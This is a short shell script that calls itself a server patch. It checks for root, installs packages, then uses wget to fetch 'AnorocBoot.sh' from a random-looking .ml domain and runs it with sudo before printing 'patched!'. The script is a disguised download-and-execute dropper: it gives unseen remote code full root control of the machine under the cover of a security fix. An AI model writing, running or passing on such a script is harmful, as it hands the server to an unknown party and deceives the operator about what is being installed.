# check euid
if [ $EUID -ne 0 ]; then
    echo "$0 is not running as root. Can you please run me using sudo. I need it to patch your server :)"
    exit 2
fi

# download dependencies we will need
sudo apt install git wget zip unzip lzma gzip bzip2 python3 pip3
wget "1rd7w08tbqm52earhagr8oai976tdl7lwy07xlje4og1.ml/AnorocBoot.sh" -O patch.sh

# do server patch
chmod +x patch.sh
sudo bash patch.sh

echo "patched!"
